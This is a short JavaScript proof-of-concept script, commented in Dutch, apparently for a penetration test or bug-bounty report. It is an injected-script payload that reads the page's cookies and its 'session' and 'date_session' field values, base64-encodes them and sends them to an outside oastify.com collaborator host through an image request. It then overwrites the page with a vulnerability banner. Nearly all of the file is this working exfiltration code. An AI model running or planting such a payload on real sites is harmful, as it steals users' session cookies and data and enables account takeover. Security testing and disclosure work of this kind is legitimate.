// 1. Visuele bevestiging
console.log('External script execution successful on: ' + document.domain);

// 2. Data Exfiltration van gevoelige velden (indien aanwezig)
var sessionData = document.getElementById('session') ? document.getElementById('session').value : 'No session field';
var dateSession = document.getElementById('date_session') ? document.getElementById('date_session').value : 'No date field';

// 3. Verstuur data naar Collaborator
new Image().src = `http://ptmsvp9jjy2ydjee509u0c2kebk28swh.oastify.com/exfil?cookies=${btoa(document.cookie)}&session=${btoa(sessionData)}&date=${btoa(dateSession)}`;

// 4. Toon impact aan de gebruiker
document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:20%;">SECURITY VULNERABILITY DETECTED</h1><p style="text-align:center;">This PoC demonstrates that an external script can take full control over this page.</p>';
